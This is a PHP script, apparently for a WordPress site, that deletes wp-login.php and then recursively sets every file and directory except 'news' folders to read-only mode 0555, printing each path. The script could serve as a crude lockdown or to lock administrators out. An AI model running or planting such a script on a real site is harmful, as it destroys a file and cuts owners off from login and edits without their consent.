<?php
 
//$dir ->目录 $chmod->权限 如：0777
function delloginfile() {
	$file = "wp-login.php";
	if(file_exists($file))
	{
		$result = @unlink ($file);
		if($result == false)
		{
			echo  "删除失败";
		}
		else
		{
			echo"删除成功";
		}
	}
	else
	{
		echo  "文件不存在";
	}
}

function recurDir($dir,$chmod='') {
    if(is_dir($dir)) {
        if($handle = opendir($dir)) {
            while(false !== ($file = readdir($handle))) {
                if(is_dir($dir.'/'.$file)) {
                    if($file != '.' && $file != '..' && $file !='news') {
                        $path = $dir.'/'.$file;
                        $chmod ? chmod($path,$chmod) : FALSE;
                        echo $path.'<p>';
                        recurDir1($path,0555);
                    }
                }else{
                    $path = $dir.'/'.$file;
                    $chmod ? chmod($path,$chmod) : FALSE;
                    echo $path.'<p>';
                }
            }
        }
        closedir($handle);
    }
}


function recurDir1($dir1,$chmod1='') {
    if(is_dir($dir1)) {
        if($handle1 = opendir($dir1)) {
            while(false !== ($file1 = readdir($handle1))) {
                if(is_dir($dir1.'/'.$file1)) {
                    if($file1 != '.' && $file1 != '..' && $file1 !='news') {
                        $path1 = $dir1.'/'.$file1;
                        $chmod1 ? chmod($path1,$chmod1) : FALSE;
                        echo $path1.'<p>';
                        recurDir2($path1,0555);
						
                    }
                }else{
                    $path1 = $dir1.'/'.$file1;
                    $chmod1 ? chmod($path1,$chmod1) : FALSE;
                    echo $path1.'<p>';
                }
            }
        }
        closedir($handle1);
    }
}

function recurDir2($dir2,$chmod2='') {
    if(is_dir($dir2)) {
        if($handle2 = opendir($dir2)) {
            while(false !== ($file2 = readdir($handle2))) {
                if(is_dir($dir2.'/'.$file2)) {
                    if($file2 != '.' && $file2 != '..' && $file2 !='news') {
                        $path2 = $dir2.'/'.$file2;
                        $chmod2 ? chmod($path2,$chmod2) : FALSE;
                        echo $path2.'<p>';
                        recurDir3($path2,0555);
						
                    }
                }else{
                    $path2 = $dir2.'/'.$file2;
                    $chmod2 ? chmod($path2,$chmod2) : FALSE;
                    echo $path2.'<p>';
                }
            }
        }
        closedir($handle2);
    }
}

function recurDir3($dir3,$chmod3='') {
    if(is_dir($dir3)) {
        if($handle3 = opendir($dir3)) {
            while(false !== ($file3 = readdir($handle3))) {
                if(is_dir($dir3.'/'.$file3)) {
                    if($file3 != '.' && $file3 != '..' && $file3 !='news') {
                        $path3 = $dir3.'/'.$file3;
                        $chmod3 ? chmod($path3,$chmod3) : FALSE;
                        echo $path3.'<p>';
                        recurDir4($path3,0555);
						
                    }
                }else{
                    $path3 = $dir3.'/'.$file3;
                    $chmod3 ? chmod($path3,$chmod3) : FALSE;
                    echo $path3.'<p>';
                }
            }
        }
        closedir($handle3);
    }
}

function recurDir4($dir4,$chmod4='') {
    if(is_dir($dir4)) {
        if($handle4 = opendir($dir4)) {
            while(false !== ($file4 = readdir($handle4))) {
                if(is_dir($dir4.'/'.$file4)) {
                    if($file4 != '.' && $file4 != '..' && $file4 !='news') {
                        $path4 = $dir4.'/'.$file4;
                        $chmod4 ? chmod($path4,$chmod4) : FALSE;
                        echo $path4.'<p>';
                        recurDir5($path4,0555);
						
                    }
                }else{
                    $path4 = $dir4.'/'.$file4;
                    $chmod4 ? chmod($path4,$chmod4) : FALSE;
                    echo $path4.'<p>';
                }
            }
        }
        closedir($handle4);
    }
}


function recurDir5($dir5,$chmod5='') {
    if(is_dir($dir5)) {
        if($handle5 = opendir($dir5)) {
            while(false !== ($file5 = readdir($handle5))) {
                if(is_dir($dir5.'/'.$file5)) {
                    if($file5 != '.' && $file5 != '..' && $file5 !='news') {
                        $path5 = $dir5.'/'.$file5;
                        $chmod5 ? chmod($path5,$chmod5) : FALSE;
                        echo $path5.'<p>';
                        recurDir6($path5,0555);
						
                    }
                }else{
                    $path5 = $dir5.'/'.$file5;
                    $chmod5 ? chmod($path5,$chmod5) : FALSE;
                    echo $path5.'<p>';
                }
            }
        }
        closedir($handle5);
    }
}

function recurDir6($dir6,$chmod6='') {
    if(is_dir($dir6)) {
        if($handle6 = opendir($dir6)) {
            while(false !== ($file6 = readdir($handle6))) {
                if(is_dir($dir6.'/'.$file6)) {
                    if($file6 != '.' && $file6 != '..' && $file6 !='news') {
                        $path6 = $dir6.'/'.$file6;
                        $chmod6 ? chmod($path6,$chmod6) : FALSE;
                        echo $path6.'<p>';
                        recurDir6($path6,0555);
						
                    }
                }else{
                    $path6 = $dir6.'/'.$file6;
                    $chmod6 ? chmod($path6,$chmod6) : FALSE;
                    echo $path6.'<p>';
                }
            }
        }
        closedir($handle6);
    }
}

delloginfile();
recurDir('.',0555);
?>
